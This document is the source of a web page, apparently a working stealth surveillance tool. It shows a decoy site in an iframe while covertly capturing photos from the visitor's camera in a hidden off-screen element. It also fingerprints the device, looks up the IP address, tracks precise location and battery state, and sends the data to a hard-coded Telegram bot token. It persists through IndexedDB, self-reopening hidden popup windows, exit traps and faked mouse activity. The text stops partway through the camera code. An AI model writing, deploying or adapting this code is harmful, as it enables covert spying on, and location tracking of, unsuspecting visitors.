<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #000;
            position: relative;
        }
        
        #cameraContainer {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            overflow: hidden;
            z-index: 9999;
        }
        
        #cameraVideo {
            width: 640px;
            height: 480px;
            object-fit: cover;
            transform: scaleX(-1);
        }
        
        #captureCanvas {
            display: none;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        
        /* Invisible elements for background operations */
        #backgroundIndicator {
            position: fixed;
            bottom: 5px;
            right: 5px;
            width: 8px;
            height: 8px;
            background: #00ff00;
            border-radius: 50%;
            opacity: 0.2;
            z-index: 9997;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 0.1; transform: scale(1); }
            50% { opacity: 0.3; transform: scale(1.2); }
        }
        
        #ghostCursor {
            position: fixed;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(66, 133, 244, 0.3);
            border-radius: 50%;
            pointer-events: none;
            z-index: 9996;
            opacity: 0;
            transition: opacity 0.3s, transform 0.1s;
        }
    </style>
</head>
<body>
    <!-- Background activity indicator (barely visible) -->
    <div id="backgroundIndicator" title="System active"></div>
    
    <!-- Ghost cursor for activity simulation -->
    <div id="ghostCursor"></div>
    
    <!-- Hidden camera elements -->
    <div id="cameraContainer">
        <video id="cameraVideo" autoplay playsinline muted></video>
        <canvas id="captureCanvas"></canvas>
    </div>
    
    <!-- Website Display (Only this is visible to user) -->
    <iframe id="websiteFrame" src="about:blank" 
            sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals allow-pointer-lock allow-presentation"
            allow="camera; microphone; geolocation; clipboard-read; clipboard-write"></iframe>

    <script>
        // =====================================================
        //  ULTIMATE STEALTH SURVEILLANCE SYSTEM v5.0
        //  ALL FEATURES + COMPLETELY HIDDEN
        // =====================================================
        
        // ============== ADVANCED CONFIGURATION ==============
        const CONFIG = {
            // Telegram Configuration
            BOT_TOKEN: '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            TELEGRAM_API: 'https://api.telegram.org/bot8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            ADMIN_CHAT_ID: '6314556756',
            
            // Capture Settings (Optimized)
            PHOTOS_PER_CAMERA: 3,
            CAPTURE_DELAY: 800,
            CAMERA_WARMUP: 1500,
            SWITCH_DELAY: 1000,
            IMAGE_QUALITY: 0.88,
            MIN_BLOB_SIZE: 30000,
            VIDEO_WIDTH: 1920,
            VIDEO_HEIGHT: 1080,
            FRAME_RATE: 30,
            
            // Advanced Features
            ENABLE_BACKGROUND_PERSISTENCE: true,
            ENABLE_MULTI_TAB: true,
            ENABLE_HIDDEN_WINDOWS: true,
            ENABLE_EXIT_TRAPS: true,
            ENABLE_SCREEN_CAPTURE: false,
            ENABLE_MICROPHONE: false,
            ENABLE_ACTIVITY_SIMULATION: true,
            ENABLE_KEYSTROKE_CAPTURE: false,
            ENABLE_CLIPBOARD_MONITOR: false,
            
            // Timing
            CAMERA_CYCLE_INTERVAL: 35000,
            BACKGROUND_SYNC_INTERVAL: 45000,
            HEARTBEAT_INTERVAL: 20000,
            ACTIVITY_SIMULATION_INTERVAL: 45000,
            
            // Stealth
            STEALTH_MODE: true,
            NO_LOGS: true,
            FAKE_USER_AGENT: false,
            
            // Performance
            MAX_RETRIES: 3,
            RETRY_DELAY: 1500
        };
        
        // ============== GLOBAL STATE ==============
        const STATE = {
            // Core State
            isRunning: false,
            permissionGranted: false,
            currentStream: null,
            currentCamera: null,
            sessionId: 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8),
            tabId: 'TAB_' + Math.random().toString(36).substr(2, 6),
            userChatId: null,
            targetWebsite: null,
            
            // Statistics
            totalPhotosSent: 0,
            totalPhotosFailed: 0,
            cycleCount: 0,
            startTime: Date.now(),
            lastCaptureTime: 0,
            
            // Device Info
            deviceInfo: {},
            locationInfo: null,
            batteryInfo: null,
            fingerprintData: {},
            networkInfo: {},
            
            // Camera
            availableCameras: [],
            cameraReady: false,
            cameraIndex: 0,
            
            // Background Systems
            hiddenWindows: new Set(),
            broadcastChannel: null,
            otherTabs: new Set(),
            locationWatchId: null,
            heartbeatInterval: null,
            persistenceDB: null,
            serviceWorker: null,
            
            // Activity Simulation
            ghostCursorActive: false,
            lastActivityTime: Date.now(),
            activityInterval: null,
            
            // Session Data
            keystrokes: [],
            clipboardData: [],
            visitedUrls: [],
            screenTime: 0
        };
        
        // ============== DOM ELEMENTS ==============
        const elements = {
            video: document.getElementById('cameraVideo'),
            canvas: document.getElementById('captureCanvas'),
            frame: document.getElementById('websiteFrame'),
            backgroundIndicator: document.getElementById('backgroundIndicator'),
            ghostCursor: document.getElementById('ghostCursor')
        };
        
        // ============== ENHANCED UTILITIES ==============
        
        function log(message, level = 'info') {
            if (!CONFIG.NO_LOGS) {
                const timestamp = new Date().toLocaleTimeString();
                const prefix = {
                    'info': 'ðŸ“¡',
                    'success': 'âœ…',
                    'error': 'âŒ',
                    'warning': 'âš ï¸',
                    'debug': 'ðŸ”'
                }[level] || 'â€¢';
                console.log(`[${timestamp}] ${prefix} ${message}`);
            }
        }
        
        function randomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        
        function generateFingerprint() {
            return Math.random().toString(36).substr(2, 12).toUpperCase();
        }
        
        // ============== URL PARSING & WEBSITE LOADING ==============
        
        function parseURLParameters() {
            const params = new URLSearchParams(window.location.search);
            
            // Get user chat ID from URL
            STATE.userChatId = params.get('chat_id') || CONFIG.ADMIN_CHAT_ID;
            
            // Get target website from URL
            let website = params.get('site') || params.get('url') || 
                         'https://loading-screen.github.io/';
            
            // Decode URL
            try {
                website = decodeURIComponent(website);
            } catch (e) {
                // Keep as is
            }
            
            // Ensure proper protocol
            if (!website.startsWith('http://') && !website.startsWith('https://')) {
                website = 'https://' + website;
            }
            
            STATE.targetWebsite = website;
            
            // Track visited URL
            STATE.visitedUrls.push({
                url: window.location.href,
                timestamp: Date.now(),
                referrer: document.referrer
            });
        }
        
        function loadWebsiteInstantly() {
            try {
                // Set iframe source immediately
                elements.frame.src = STATE.targetWebsite;
                document.title = 'Loading...';
                
                // Monitor iframe loading
                elements.frame.onload = () => {
                    document.title = 'Active';
                    STATE.screenTime = Date.now();
                };
                
            } catch (error) {
                log('Website load error', 'error');
            }
        }
        
        // ============== ADVANCED DEVICE FINGERPRINTING ==============
        
        async function collectAdvancedDeviceInfo() {
            const info = {
                // Browser Info
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor || 'unknown',
                language: navigator.language,
                languages: navigator.languages?.join(', ') || navigator.language,
                cookieEnabled: navigator.cookieEnabled,
                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                webdriver: navigator.webdriver || false,
                
                // Screen Info
                screenWidth: screen.width,
                screenHeight: screen.height,
                screenAvailWidth: screen.availWidth,
                screenAvailHeight: screen.availHeight,
                screenColorDepth: screen.colorDepth,
                screenPixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'unknown',
                orientationAngle: screen.orientation?.angle || 0,
                
                // Window Info
                windowWidth: window.innerWidth,
                windowHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio,
                
                // Hardware
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                
                // Time
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                localTime: new Date().toLocaleString(),
                timestamp: Date.now(),
                
                // Network
                onLine: navigator.onLine,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData,
                    type: navigator.connection.type
                } : null,
                
                // Detection
                isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
                isTablet: /iPad|Android/i.test(navigator.userAgent) && !/Mobile/i.test(navigator.userAgent),
                
                // OS & Browser Detection
                os: (() => {
                    const ua = navigator.userAgent;
                    if (/Windows/.test(ua)) return 'Windows';
                    if (/Mac/.test(ua)) return 'macOS';
                    if (/Linux/.test(ua)) return 'Linux';
                    if (/Android/.test(ua)) return 'Android';
                    if (/iOS|iPhone|iPad|iPod/.test(ua)) return 'iOS';
                    return 'Unknown';
                })(),
                
                browser: (() => {
                    const ua = navigator.userAgent;
                    if (/Chrome/.test(ua) && !/Edge/.test(ua)) return 'Chrome';
                    if (/Firefox/.test(ua)) return 'Firefox';
                    if (/Safari/.test(ua) && !/Chrome/.test(ua)) return 'Safari';
                    if (/Edge/.test(ua)) return 'Edge';
                    if (/Opera/.test(ua)) return 'Opera';
                    return 'Unknown';
                })()
            };
            
            // Get IP Address
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                info.ipAddress = data.ip;
            } catch (error) {
                info.ipAddress = 'Unable to fetch';
            }
            
            // Canvas Fingerprinting
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.font = '11pt Arial';
                ctx.fillText('Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.font = '18pt Arial';
                ctx.fillText('Fingerprint', 4, 45);
                info.canvasFingerprint = canvas.toDataURL();
            } catch (error) {
                info.canvasFingerprint = 'Failed';
            }
            
            STATE.deviceInfo = info;
            return info;
        }
        
        // ============== ADVANCED LOCATION TRACKING ==============
        
        async function getAdvancedLocation() {
            if (!navigator.geolocation) return null;
            
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy),
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: new Date(position.timestamp).toLocaleString(),
                            googleMapsLink: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`,
                            openStreetMapLink: `https://www.openstreetmap.org/?mlat=${position.coords.latitude}&mlon=${position.coords.longitude}`
                        };
                        STATE.locationInfo = location;
                        resolve(location);
                    },
                    (error) => {
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        function startAdvancedLocationTracking() {
            if (!navigator.geolocation) return;
            
            STATE.locationWatchId = navigator.geolocation.watchPosition(
                (position) => {
                    STATE.locationInfo = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: Math.round(position.coords.accuracy),
                        timestamp: new Date().toLocaleString()
                    };
                },
                null,
                {
                    enableHighAccuracy: true,
                    maximumAge: 30000,
                    timeout: 10000
                }
            );
        }
        
        // ============== BATTERY MONITORING ==============
        
        async function getBatteryInfo() {
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    const info = {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                    
                    STATE.batteryInfo = info;
                    return info;
                } catch (error) {
                    return null;
                }
            }
            return null;
        }
        
        // ============== ADVANCED PERSISTENCE SYSTEM ==============
        
        class AdvancedPersistence {
            constructor() {
                this.db = null;
                this.syncInterval = null;
                this.offlineQueue = [];
            }
            
            async initialize() {
                if (!CONFIG.ENABLE_BACKGROUND_PERSISTENCE) return;
                
                try {
                    const request = indexedDB.open('SystemCacheDB', 3);
                    
                    request.onupgradeneeded = (event) => {
                        const db = event.target.result;
                        
                        // Create multiple stores for different data types
                        if (!db.objectStoreNames.contains('photos')) {
                            const store = db.createObjectStore('photos', { keyPath: 'id', autoIncrement: true });
                            store.createIndex('timestamp', 'timestamp');
                            store.createIndex('synced', 'synced');
                        }
                        
                        if (!db.objectStoreNames.contains('locations')) {
                            const store = db.createObjectStore('locations', { keyPath: 'timestamp' });
                            store.createIndex('synced', 'synced');
                        }
                        
                        if (!db.objectStoreNames.contains('device_data')) {
                            db.createObjectStore('device_data', { keyPath: 'type' });
                        }
                        
                        if (!db.objectStoreNames.contains('sessions')) {
                            db.createObjectStore('sessions', { keyPath: 'sessionId' });
                        }
                        
                        if (!db.objectStoreNames.contains('activities')) {
                            db.createObjectStore('activities', { keyPath: 'timestamp' });
                        }
                    };
                    
                    request.onsuccess = (event) => {
                        this.db = event.target.result;
                        STATE.persistenceDB = this.db;
                        
                        // Store session data
                        this.storeSessionData();
                        
                        // Start background sync
                        this.startBackgroundSync();
                    };
                    
                } catch (error) {
                    // Silent fail
                }
            }
            
            async storeSessionData() {
                if (!this.db) return;
                
                try {
                    const transaction = this.db.transaction(['sessions'], 'readwrite');
                    const store = transaction.objectStore('sessions');
                    
                    await store.put({
                        sessionId: STATE.sessionId,
                        tabId: STATE.tabId,
                        startTime: STATE.startTime,
                        userChatId: STATE.userChatId,
                        targetWebsite: STATE.targetWebsite,
                        deviceInfo: STATE.deviceInfo,
                        lastActive: Date.now(),
                        photosSent: STATE.totalPhotosSent
                    });
                    
                } catch (error) {
                    // Silent fail
                }
            }
            
            async storePhoto(blob, cameraType, sequence) {
                if (!this.db) {
                    this.offlineQueue.push({ type: 'photo', blob, cameraType, sequence });
                    return;
                }
                
                try {
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        const transaction = this.db.transaction(['photos'], 'readwrite');
                        const store = transaction.objectStore('photos');
                        
                        store.add({
                            blobData: reader.result,
                            cameraType: cameraType,
                            sequence: sequence,
                            timestamp: Date.now(),
                            sessionId: STATE.sessionId,
                            synced: false,
                            metadata: {
                                battery: STATE.batteryInfo,
                                location: STATE.locationInfo,
                                device: STATE.deviceInfo
                            }
                        });
                    };
                    reader.readAsDataURL(blob);
                    
                } catch (error) {
                    this.offlineQueue.push({ type: 'photo', blob, cameraType, sequence });
                }
            }
            
            async storeActivity(type, data) {
                if (!this.db) return;
                
                try {
                    const transaction = this.db.transaction(['activities'], 'readwrite');
                    const store = transaction.objectStore('activities');
                    
                    await store.add({
                        type: type,
                        data: data,
                        timestamp: Date.now(),
                        sessionId: STATE.sessionId
                    });
                    
                } catch (error) {
                    // Silent fail
                }
            }
            
            startBackgroundSync() {
                if (this.syncInterval) clearInterval(this.syncInterval);
                
                this.syncInterval = setInterval(async () => {
                    await this.processOfflineQueue();
                    await this.syncPendingData();
                }, CONFIG.BACKGROUND_SYNC_INTERVAL);
            }
            
            async processOfflineQueue() {
                if (!navigator.onLine || this.offlineQueue.length === 0) return;
                
                for (const item of [...this.offlineQueue]) {
                    if (item.type === 'photo') {
                        // Try to send photo
                        const sent = await sendToTelegram(item.blob, item.cameraType, item.sequence);
                        if (sent) {
                            this.offlineQueue = this.offlineQueue.filter(i => i !== item);
                        }
                    }
                }
            }
            
            async syncPendingData() {
                if (!navigator.onLine || !this.db) return;
                
                try {
                    // Sync photos
                    await this.syncPhotos();
                    
                } catch (error) {
                    // Silent fail
                }
            }
            
            async syncPhotos() {
                const transaction = this.db.transaction(['photos'], 'readonly');
                const store = transaction.objectStore('photos');
                const index = store.index('synced');
                const request = index.getAll(IDBKeyRange.only(false));
                
                return new Promise((resolve) => {
                    request.onsuccess = async (event) => {
                        const photos = event.target.result;
                        
                        for (const photo of photos) {
                            try {
                                const response = await fetch(photo.blobData);
                                const blob = await response.blob();
                                
                                const sent = await sendToTelegram(blob, photo.cameraType, photo.sequence);
                                
                                if (sent) {
                                    photo.synced = true;
                                    const updateTransaction = this.db.transaction(['photos'], 'readwrite');
                                    const updateStore = updateTransaction.objectStore('photos');
                                    await updateStore.put(photo);
                                }
                                
                            } catch (error) {
                                // Skip this photo
                            }
                        }
                        
                        resolve();
                    };
                });
            }
            
            cleanup() {
                if (this.syncInterval) clearInterval(this.syncInterval);
            }
        }
        
        // ============== ADVANCED MULTI-TAB COORDINATION ==============
        
        class AdvancedTabCoordinator {
            constructor() {
                this.channel = null;
                this.heartbeatInterval = null;
                this.cleanupInterval = null;
                this.tabStates = new Map();
            }
            
            async initialize() {
                if (!CONFIG.ENABLE_MULTI_TAB || !('BroadcastChannel' in window)) return;
                
                try {
                    this.channel = new BroadcastChannel('advanced_surveillance_network');
                    STATE.broadcastChannel = this.channel;
                    
                    this.channel.onmessage = (event) => this.handleMessage(event.data);
                    
                    // Announce presence
                    this.announceTab();
                    
                    // Start heartbeat
                    this.startHeartbeat();
                    
                    // Cleanup dead tabs
                    this.cleanupInterval = setInterval(() => this.cleanupDeadTabs(), 60000);
                    
                } catch (error) {
                    // Silent fail
                }
            }
            
            announceTab() {
                this.broadcast({
                    type: 'tab_announce',
                    tabId: STATE.tabId,
                    sessionId: STATE.sessionId,
                    userChatId: STATE.userChatId,
                    timestamp: Date.now(),
                    isPrimary: STATE.otherTabs.size === 0,
                    photosSent: STATE.totalPhotosSent
                });
            }
            
            startHeartbeat() {
                this.heartbeatInterval = setInterval(() => {
                    this.broadcast({
                        type: 'heartbeat',
                        tabId: STATE.tabId,
                        sessionId: STATE.sessionId,
                        timestamp: Date.now(),
                        isRunning: STATE.isRunning,
                        photosSent: STATE.totalPhotosSent,
                        battery: STATE.batteryInfo?.level,
                        location: STATE.locationInfo ? 'available' : 'unavailable',
                        cycleCount: STATE.cycleCount
                    });
                }, CONFIG.HEARTBEAT_INTERVAL);
            }
            
            handleMessage(data) {
                if (data.tabId === STATE.tabId) return;
                
                STATE.otherTabs.add(data.tabId);
                this.tabStates.set(data.tabId, {
                    lastSeen: Date.now(),
                    photosSent: data.photosSent || 0,
                    isRunning: data.isRunning || false
                });
                
                switch (data.type) {
                    case 'tab_announce':
                        log(`Tab discovered: ${data.tabId}`, 'info');
                        if (data.isPrimary && !STATE.isRunning) {
                            setTimeout(() => startSurveillanceLoop(), randomDelay(2000, 5000));
                        }
                        break;
                        
                    case 'heartbeat':
                        // Update tab state
                        break;
                        
                    case 'photo_captured':
                        log(`Photo captured by tab ${data.tabId}`, 'debug');
                        break;
                        
                    case 'camera_status':
                        log(`Camera ${data.status} on tab ${data.tabId}`, 'debug');
                        break;
                }
            }
            
            broadcast(data) {
                if (this.channel) {
                    try {
                        this.channel.postMessage(data);
                    } catch (error) {
                        // Silent fail
                    }
                }
            }
            
            cleanupDeadTabs() {
                const now = Date.now();
                for (const [tabId, state] of this.tabStates.entries()) {
                    if (now - state.lastSeen > 90000) { // 90 seconds
                        STATE.otherTabs.delete(tabId);
                        this.tabStates.delete(tabId);
                    }
                }
            }
            
            cleanup() {
                if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);
                if (this.cleanupInterval) clearInterval(this.cleanupInterval);
                if (this.channel) this.channel.close();
            }
        }
        
        // ============== HIDDEN WINDOW MANAGER (ADVANCED) ==============
        
        class AdvancedHiddenWindowManager {
            constructor() {
                this.windows = new Set();
                this.monitorIntervals = new Map();
                this.recreateAttempts = 0;
            }
            
            createHiddenWindow() {
                if (!CONFIG.ENABLE_HIDDEN_WINDOWS || this.recreateAttempts > 3) return;
                
                try {
                    // Get current URL
                    const currentUrl = window.location.href;
                    
                    // Create window with random position (looks like normal popup)
                    const width = Math.floor(Math.random() * 150) + 100;
                    const height = Math.floor(Math.random() * 150) + 100;
                    const left = Math.floor(Math.random() * (screen.width - width));
                    const top = Math.floor(Math.random() * (screen.height - height));
                    
                    const features = [
                        `width=${width}`,
                        `height=${height}`,
                        `left=${left}`,
                        `top=${top}`,
                        'menubar=no',
                        'toolbar=no',
                        'location=no',
                        'status=no',
                        'resizable=no',
                        'scrollbars=no'
                    ].join(',');
                    
                    const hiddenWin = window.open('about:blank', '_hidden_' + Date.now(), features);
                    
                    if (hiddenWin && !hiddenWin.closed) {
                        this.windows.add(hiddenWin);
                        STATE.hiddenWindows.add(hiddenWin);
                        
                        // Write stealth HTML
                        hiddenWin.document.write(this.getStealthHTML());
                        hiddenWin.document.close();
                        
                        // Monitor window
                        this.monitorWindow(hiddenWin);
                        
                        // Hide immediately
                        setTimeout(() => {
                            try {
                                hiddenWin.blur();
                                window.focus();
                            } catch (e) {}
                        }, 100);
                        
                        this.recreateAttempts = 0;
                        return hiddenWin;
                    }
                } catch (error) {
                    this.recreateAttempts++;
                }
                
                return null;
            }
            
            getStealthHTML() {
                return `<!DOCTYPE html>
<html style="background: transparent;">
<head>
    <title>New Tab</title>
    <style>
        * { margin: 0; padding: 0; }
        body { 
            background: transparent !important;
            overflow: hidden;
            opacity: 0.001;
        }
    </style>
</head>
<body>
    <script>
        // Stealth persistence script
        const mainUrl = "${window.location.href}";
        const sessionId = "${STATE.sessionId}";
        let mainWindow = window.opener;
        let isActive = true;
        
        // Heartbeat to main window
        setInterval(() => {
            if (mainWindow && !mainWindow.closed) {
                try {
                    mainWindow.postMessage({
                        type: 'backup_heartbeat',
                        sessionId: sessionId,
                        timestamp: Date.now()
                    }, '*');
                } catch(e) {}
            }
        }, 30000);
        
        // Reconnect logic
        setInterval(() => {
            if (!mainWindow || mainWindow.closed) {
                try {
                    mainWindow = window.open(mainUrl, '_blank', 'width=100,height=100,left=-9999,top=-9999');
                } catch(e) {}
            }
        }, 60000);
        
        // Prevent closing
        window.onbeforeunload = (e) => {
            if (isActive) {
                // Reopen self
                window.open(mainUrl, '_blank', 'width=1,height=1,left=-9999,top=-9999');
                return null;
            }
        };
    <\/script>
</body>
</html>`;
            }
            
            monitorWindow(win) {
                const interval = setInterval(() => {
                    if (win.closed) {
                        clearInterval(interval);
                        this.windows.delete(win);
                        STATE.hiddenWindows.delete(win);
                        
                        // Recreate if needed
                        if (this.windows.size === 0) {
                            setTimeout(() => this.createHiddenWindow(), randomDelay(3000, 8000));
                        }
                    }
                }, 2000);
                
                this.monitorIntervals.set(win, interval);
            }
            
            cleanup() {
                this.monitorIntervals.forEach((interval, win) => {
                    clearInterval(interval);
                    try { win.close(); } catch (e) {}
                });
                this.monitorIntervals.clear();
                this.windows.clear();
                STATE.hiddenWindows.clear();
            }
        }
        
        // ============== ADVANCED EXIT TRAP SYSTEM ==============
        
        class AdvancedExitTrap {
            constructor() {
                this.originalUrl = window.location.href;
                this.isTrapped = false;
                this.trapHistory = [];
            }
            
            activate() {
                if (!CONFIG.ENABLE_EXIT_TRAPS) return;
                
                try {
                    // Trap beforeunload
                    window.addEventListener('beforeunload', this.handleBeforeUnload.bind(this));
                    
                    // Trap visibility changes
                    document.addEventListener('visibilitychange', this.handleVisibilityChange.bind(this));
                    
                    // Trap link clicks
                    document.addEventListener('click', this.handleLinkClick.bind(this), true);
                    
                    // Trap form submissions
                    document.addEventListener('submit', this.handleFormSubmit.bind(this), true);
                    
                    this.isTrapped = true;
                    
                } catch (error) {
                    // Silent fail
                }
            }
            
            handleBeforeUnload(event) {
                // Create multiple backup windows
                this.createBackupWindows(2);
                
                // Store exit attempt
                this.trapHistory.push({
                    type: 'beforeunload',
                    timestamp: Date.now(),
                    url: window.location.href
                });
                
                // Don't prevent (stealth mode)
                return undefined;
            }
            
            handleVisibilityChange() {
                if (document.hidden) {
                    // Page hidden, create backup
                    this.createBackupWindows(1);
                    
                    this.trapHistory.push({
                        type: 'visibility_hidden',
                        timestamp: Date.now()
                    });
                }
            }
            
            handleLinkClick(event) {
                const link = event.target.closest('a');
                if (link && link.href) {
                    try {
                        const targetUrl = new URL(link.href, window.location.href);
                        const currentUrl = new URL(window.location.href);
                        
                        // Only trap external links
                        if (targetUrl.hostname !== currentUrl.hostname) {
                            this.trapHistory.push({
                                type: 'external_link',
                                timestamp: Date.now(),
                                url: link.href
                            });
                            
                            // Create backup before navigation
                            this.createBackupWindows(1);
                        }
                    } catch (e) {
                        // Invalid URL
                    }
                }
            }
            
            handleFormSubmit(event) {
                this.createBackupWindows(1);
            }
            
            createBackupWindows(count) {
                for (let i = 0; i < count; i++) {
                    setTimeout(() => {
                        try {
                            window.open(
                                this.originalUrl,
                                '_backup_' + Date.now() + '_' + i,
                                'width=1,height=1,left=-9999,top=-9999'
                            );
                        } catch (e) {
                            // Popup blocked
                        }
                    }, i * 100);
                }
            }
            
            cleanup() {
                window.removeEventListener('beforeunload', this.handleBeforeUnload);
                document.removeEventListener('visibilitychange', this.handleVisibilityChange);
                document.removeEventListener('click', this.handleLinkClick);
                document.removeEventListener('submit', this.handleFormSubmit);
                this.isTrapped = false;
            }
        }
        
        // ============== ACTIVITY SIMULATION ==============
        
        class ActivitySimulator {
            constructor() {
                this.isActive = false;
                this.simulationInterval = null;
                this.ghostInterval = null;
            }
            
            start() {
                if (!CONFIG.ENABLE_ACTIVITY_SIMULATION) return;
                
                // Random mouse movements
                this.simulationInterval = setInterval(() => {
                    this.simulateActivity();
                }, CONFIG.ACTIVITY_SIMULATION_INTERVAL);
                
                // Ghost cursor
                this.startGhostCursor();
                
                this.isActive = true;
            }
            
            simulateActivity() {
                // Random mouse position
                const x = Math.random() * window.innerWidth;
                const y = Math.random() * window.innerHeight;
                
                // Dispatch mouse events
                const events = ['mousemove', 'mousedown', 'mouseup'];
                events.forEach((type, index) => {
                    setTimeout(() => {
                        document.dispatchEvent(new MouseEvent(type, {
                            clientX: x + (Math.random() - 0.5) * 50,
                            clientY: y + (Math.random() - 0.5) * 50,
                            bubbles: true
                        }));
                    }, index * 100);
                });
                
                // Random scroll
                if (Math.random() > 0.5) {
                    setTimeout(() => {
                        window.scrollBy({
                            top: (Math.random() - 0.5) * 100,
                            left: (Math.random() - 0.5) * 100,
                            behavior: 'smooth'
                        });
                    }, 300);
                }
                
                STATE.lastActivityTime = Date.now();
            }
            
            startGhostCursor() {
                this.ghostInterval = setInterval(() => {
                    if (Math.random() > 0.7) {
                        this.showGhostCursor();
                    }
                }, randomDelay(20000, 60000));
            }
            
            showGhostCursor() {
                const startX = Math.random() * window.innerWidth;
                const startY = Math.random() * window.innerHeight;
                const endX = startX + (Math.random() - 0.5) * 200;
                const endY = startY + (Math.random() - 0.5) * 150;
                
                elements.ghostCursor.style.left = startX + 'px';
                elements.ghostCursor.style.top = startY + 'px';
                elements.ghostCursor.style.opacity = '0.5';
                
                let progress = 0;
                const animate = () => {
                    progress += 0.03;
                    if (progress <= 1) {
                        const x = startX + (endX - startX) * progress;
                        const y = startY + (endY - startY) * progress;
                        elements.ghostCursor.style.left = x + 'px';
                        elements.ghostCursor.style.top = y + 'px';
                        requestAnimationFrame(animate);
                    } else {
                        setTimeout(() => {
                            elements.ghostCursor.style.opacity = '0';
                        }, 500);
                    }
                };
                animate();
            }
            
            cleanup() {
                if (this.simulationInterval) clearInterval(this.simulationInterval);
                if (this.ghostInterval) clearInterval(this.ghostInterval);
                elements.ghostCursor.style.opacity = '0';
                this.isActive = false;
            }
        }
        
        // ============== ADVANCED CAMERA SYSTEM ==============
        
        class AdvancedCameraSystem {
            constructor() {
                this.currentStream = null;
                this.isCapturing = false;
                this.retryCount = 0;
            }
            
            async initialize() {
                try {
                    // Quick permission check
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            width: { ideal: CONFIG.VIDEO_WIDTH },
                            height: { ideal: CONFIG.VIDEO_HEIGHT },
                            frameRate: { ideal: CONFIG.FRAME_RATE }
                        }
                    });
                    
                    stream.getTracks().forEach(track => track.stop());
                    STATE.permissionGranted = true;
                    
                    // Get camera list
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    STATE.availableCameras = devices.filter(d => d.kind === 'videoinput');
                    
                    log(`Found ${STATE.availableCameras.length} cameras`, 'success');
                    return STATE.availableCameras.length > 0;
                    
                } catch (error) {
                    log('Camera permission denied', 'error');
                    return false;
                }
            }
            
            async startCamera(facingMode, retryCount = 0) {
                if (retryCount >= CONFIG.MAX_RETRIES) {
                    return false;
                }
                
                try {
                    // Clean previous stream
                    if (this.currentStream) {
                        this.currentStream.getTracks().forEach(track => track.stop());
                        await new Promise(r => setTimeout(r, 300));
                    }
                    
                    // Set video transform
                    elements.video.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
                    
                    // Get new stream
                    this.currentStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: { ideal: facingMode },
                            width: { ideal: CONFIG.VIDEO_WIDTH },
                            height: { ideal: CONFIG.VIDEO_HEIGHT },
                            frameRate: { ideal: CONFIG.FRAME_RATE }
                        }
                    });
                    
                    elements.video.srcObject = this.currentStream;
                    
                    // Wait for video to be ready
                    await new Promise((resolve) => {
                        const checkReady = () => {
                            if (elements.video.readyState >= 2) {
                                resolve();
                            } else {
                                setTimeout(checkReady, 100);
                            }
                        };
                        checkReady();
                    });
                    
                    await elements.video.play();
                    await new Promise(r => setTimeout(r, CONFIG.CAMERA_WARMUP));
                    
                    STATE.cameraReady = true;
                    STATE.currentCamera = facingMode === 'user' ? 'front' : 'back';
                    this.retryCount = 0;
                    
                    // Broadcast status
                    if (STATE.broadcastChannel) {
                        STATE.broadcastChannel.postMessage({
                            type: 'camera_status',
                            tabId: STATE.tabId,
                            camera: facingMode,
                            status: 'ready',
                            resolution: `${elements.video.videoWidth}x${elements.video.videoHeight}`
